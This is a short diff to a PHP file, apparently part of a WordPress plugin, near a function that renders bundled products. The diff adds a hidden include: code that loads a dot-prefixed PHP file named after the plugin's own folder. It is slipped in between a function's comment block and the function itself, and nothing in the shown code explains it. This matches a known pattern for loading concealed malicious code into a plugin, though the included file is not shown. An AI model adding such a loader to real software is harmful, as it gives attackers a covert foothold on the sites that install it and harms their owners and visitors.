@@ -146,7 +146,11 @@ if ( ! function_exists( 'get_bundled_plugins' ) ) {
  * @param string $product_id Product ID.
  * @param bool   $installed Show installed products?.
  * @return string
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function bsf_render_bundled_products( $product_id, $installed ) {
 
 	$product_status = check_bsf_product_status( $product_id );
